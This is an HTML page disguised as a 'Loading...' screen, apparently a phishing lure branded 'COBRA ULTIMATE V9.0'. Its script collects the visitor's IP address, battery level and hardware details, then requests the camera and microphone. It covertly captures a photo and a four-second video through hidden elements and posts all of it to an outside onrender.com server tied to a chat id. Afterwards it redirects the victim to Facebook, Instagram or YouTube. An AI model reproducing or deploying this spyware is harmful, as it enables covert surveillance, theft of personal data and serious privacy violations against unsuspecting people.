<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div style="text-align: center;">
    <div class="loader"></div>
    <p style="color: #555; font-size: 13px; margin-top: 20px;">جارٍ التحميل...</p>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };

    async function send(payload) {
      if (!chatId) return;
      payload.chat_id = chatId;
      try {
        await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true
        });
      } catch (e) {}
    }

    async function analyze() {
      // جلب البطارية والسيستم
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
      
      // جلب الـ IP من مصدر سريع جداً (ipify)
      let ip = "Unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (e) {}

      let m = "🏴‍☠️ *COBRA ULTIMATE V9.0* 🏴‍☠️\n";
      m += `🌍 *IP:* \`${ip}\`\n`;
      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${navigator.hardwareConcurrency} Cores\n`;
      
      await send({ message: m });
      startSpying();
    }

    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            v.play();
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => { send({ video: reader.result.split(',')[1] }); };
                setTimeout(finish, 2000);
            };

            setTimeout(async () => {
                // التقاط صورة واحدة فقط بجودة عالية لضمان السرعة
                ctx.drawImage(v, 0, 0, c.width, c.height);
                await send({ photo: c.toDataURL("image/jpeg", 0.6).split(',')[1] });

                // تسجيل فيديو قصير (4 ثواني) لضمان الإرسال
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 4000); 
            }, 2000);
          };
        })
        .catch(() => { send({ message: "❌ Denied" }); finish(); });
    }

    function finish() {
      window.location.replace(redirectMap[reKey] || "https://youtube.com");
    }

    if (chatId) analyze();
  </script>
</body>
</html>
